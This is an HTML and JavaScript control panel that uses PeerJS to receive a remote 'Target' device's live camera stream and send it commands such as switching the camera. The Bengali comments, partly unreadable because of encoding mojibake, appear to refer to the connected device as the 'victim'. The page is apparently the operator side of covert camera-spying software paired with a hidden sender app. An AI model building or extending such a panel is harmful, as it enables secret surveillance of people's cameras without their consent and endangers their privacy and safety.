<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Control Center</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        /* ‡¶§‡ßã‡¶∞ ‡¶™‡¶õ‡¶®‡ßç‡¶¶‡ßá‡¶∞ Neumorphism ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤ */
        body {
            background-color: #e0e5ec;
            color: #4a4a4a;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        h2 { margin-bottom: 10px; color: #555; }

        /* ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶Æ‡¶®‡¶ø‡¶ü‡¶∞ */
        .monitor-frame {
            width: 90%;
            max-width: 600px;
            height: 50vh;
            border-radius: 20px;
            background: #e0e5ec;
            border: 5px solid #e0e5ec;
            box-shadow: inset 8px 8px 16px rgb(163,177,198,0.6), 
                       inset -8px -8px 16px rgba(255,255,255, 0.8);
            padding: 10px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        video {
            width: 100%;
            height: 100%;
            border-radius: 15px;
            object-fit: cover;
            background-color: #000;
        }

        /* ‡¶ï‡¶®‡ßç‡¶ü‡ßç‡¶∞‡ßã‡¶≤ ‡¶™‡ßç‡¶Ø‡¶æ‡¶®‡ßá‡¶≤ */
        .controls {
            margin-top: 25px;
            padding: 20px;
            border-radius: 20px;
            background: #e0e5ec;
            box-shadow: 9px 9px 16px rgb(163,177,198,0.6), 
                       -9px -9px 16px rgba(255,255,255, 0.8);
            text-align: center;
            width: 80%;
            max-width: 400px;
        }

        /* ‡¶¨‡¶æ‡¶ü‡¶® ‡¶°‡¶ø‡¶ú‡¶æ‡¶á‡¶® */
        .btn {
            padding: 12px 25px;
            border: none;
            outline: none;
            border-radius: 30px;
            background-color: #e0e5ec;
            box-shadow: 6px 6px 10px rgb(163,177,198,0.6), 
                       -6px -6px 10px rgba(255,255,255, 0.8);
            color: #333;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s ease;
            margin: 5px;
        }

        .btn:active {
            box-shadow: inset 4px 4px 8px rgb(163,177,198,0.6), 
                        inset -4px -4px 8px rgba(255,255,255, 0.8);
            transform: translateY(2px);
        }

        .btn-danger { color: #ff3d00; }
        .btn-primary { color: #007bff; }

        .status-log {
            font-size: 12px;
            color: #666;
            margin-top: 15px;
            font-family: monospace;
        }
    </style>
</head>
<body>

    <h2>Admin Monitor</h2>

    <div class="monitor-frame">
        <video id="remoteVideo" autoplay playsinline></video>
        <div id="loadingText" style="position:absolute; color:white;">Waiting for Target...</div>
    </div>

    <div class="controls">
        <p style="font-size: 13px; margin-bottom: 15px;">Target Controls</p>
        
        <button class="btn btn-primary" onclick="sendCommand('SWITCH_CAM')">üì∑ Switch Cam</button>
        <button class="btn btn-primary" onclick="sendCommand('ADMIN_CHECK')">‚ö†Ô∏è Send Warning</button>
        
        <div class="status-log" id="status">System Initializing...</div>
        <div style="font-size: 10px; margin-top: 5px; color: green;">My ID: ADMIN_KAWSAR</div>
    </div>

    <script>
        const remoteVideo = document.getElementById('remoteVideo');
        const statusLog = document.getElementById('status');
        const loadingText = document.getElementById('loadingText');

        // ‡¶è‡¶á ‡¶Ü‡¶á‡¶°‡¶ø‡¶ü‡¶æ ‡¶§‡ßã‡¶∞ ‡¶∏‡ßá‡¶®‡ßç‡¶°‡¶æ‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™‡ßá ‡¶´‡¶ø‡¶ï‡ßç‡¶∏‡¶° ‡¶ï‡¶∞‡¶æ ‡¶Ü‡¶õ‡ßá, ‡¶§‡¶æ‡¶á ‡¶è‡¶ñ‡¶æ‡¶®‡ßá‡¶ì ‡¶è‡¶ü‡¶æ‡¶á ‡¶∞‡¶æ‡¶ñ‡¶§‡ßá ‡¶π‡¶¨‡ßá
        const MY_ID = 'ADMIN_KAWSAR';
        
        let peer = null;
        let activeCall = null;
        let connectedPeerId = null; // ‡¶≠‡¶ø‡¶ï‡¶ü‡¶ø‡¶Æ‡ßá‡¶∞ ‡¶Ü‡¶á‡¶°‡¶ø ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶ú‡¶Æ‡¶æ ‡¶•‡¶æ‡¶ï‡¶¨‡ßá

        function initAdmin() {
            // PeerJS ‡¶∏‡¶æ‡¶∞‡ßç‡¶≠‡¶æ‡¶∞‡ßá ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡¶æ
            peer = new Peer(MY_ID, {
                host: 'peerjs.cloud', 
                port: 443, 
                secure: true
            });

            peer.on('open', (id) => {
                statusLog.innerText = "Admin Online. Waiting for connections...";
                statusLog.style.color = "green";
            });

            // ‡ßß. ‡¶ï‡ßá‡¶â ‡¶ï‡¶≤ ‡¶ï‡¶∞‡¶≤‡ßá (‡¶∏‡ßá‡¶®‡ßç‡¶°‡¶æ‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™) ‡¶∞‡¶ø‡¶∏‡¶ø‡¶≠ ‡¶ï‡¶∞‡¶æ
            peer.on('call', (call) => {
                statusLog.innerText = "Incoming Signal from Target...";
                
                // ‡¶ï‡¶≤ ‡¶∞‡¶ø‡¶∏‡¶ø‡¶≠ ‡¶ï‡¶∞‡¶æ (Answer)
                call.answer(); 
                
                // ‡¶≠‡¶ø‡¶ï‡¶ü‡¶ø‡¶Æ‡ßá‡¶∞ ‡¶Ü‡¶á‡¶°‡¶ø ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡ßá ‡¶∞‡¶æ‡¶ñ‡¶æ (‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶≤‡¶æ‡¶ó‡¶¨‡ßá)
                connectedPeerId = call.peer;
                activeCall = call;

                // ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶∏‡ßç‡¶ü‡ßç‡¶∞‡¶ø‡¶Æ ‡¶Ü‡¶∏‡¶æ ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶≤‡ßá
                call.on('stream', (remoteStream) => {
                    remoteVideo.srcObject = remoteStream;
                    loadingText.style.display = 'none'; // ‡¶≤‡ßã‡¶°‡¶ø‡¶Ç ‡¶ü‡ßá‡¶ï‡ßç‡¶∏‡¶ü ‡¶∏‡¶∞‡¶æ‡¶ì
                    statusLog.innerText = "TARGET CONNECTED & LIVE!";
                    statusLog.style.color = "blue";
                });

                call.on('close', () => {
                    resetUI();
                });
                
                call.on('error', () => {
                   resetUI();
                });
            });

            peer.on('error', (err) => {
                console.error(err);
                if(err.type === 'unavailable-id') {
                    statusLog.innerText = "Error: ID busy. Close other tabs.";
                } else {
                    statusLog.innerText = "Connection Error. Retrying...";
                    setTimeout(initAdmin, 3000);
                }
            });
        }

        // ‡ß®. ‡¶∏‡ßá‡¶®‡ßç‡¶°‡¶æ‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™‡ßá ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã (Data Connection)
        function sendCommand(cmd) {
            if (!connectedPeerId) {
                alert("Target not connected yet!");
                return;
            }

            statusLog.innerText = `Sending command: ${cmd}...`;

            // ‡¶∏‡ßá‡¶®‡ßç‡¶°‡¶æ‡¶∞‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶°‡ßá‡¶ü‡¶æ ‡¶ï‡¶æ‡¶®‡ßá‡¶ï‡¶∂‡¶® ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ
            const conn = peer.connect(connectedPeerId);

            conn.on('open', () => {
                conn.send(cmd); // ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶° ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶≤‡ßã
                statusLog.innerText = `Command '${cmd}' Sent!`;
                
                // ‡ßß ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶™‡¶∞ ‡¶∏‡ßç‡¶ü‡ßç‡¶Ø‡¶æ‡¶ü‡¶æ‡¶∏ ‡¶∞‡¶ø‡¶∏‡ßá‡¶ü
                setTimeout(() => {
                    statusLog.innerText = "Monitoring Active";
                }, 2000);
            });

            conn.on('error', (err) => {
                statusLog.innerText = "Command Failed!";
            });
        }

        function resetUI() {
            remoteVideo.srcObject = null;
            loadingText.style.display = 'block';
            statusLog.innerText = "Signal Lost. Waiting for Target...";
            statusLog.style.color = "red";
            connectedPeerId = null;
        }

        // ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ ‡¶ö‡¶æ‡¶≤‡ßÅ
        initAdmin();

    </script>
</body>
</html>
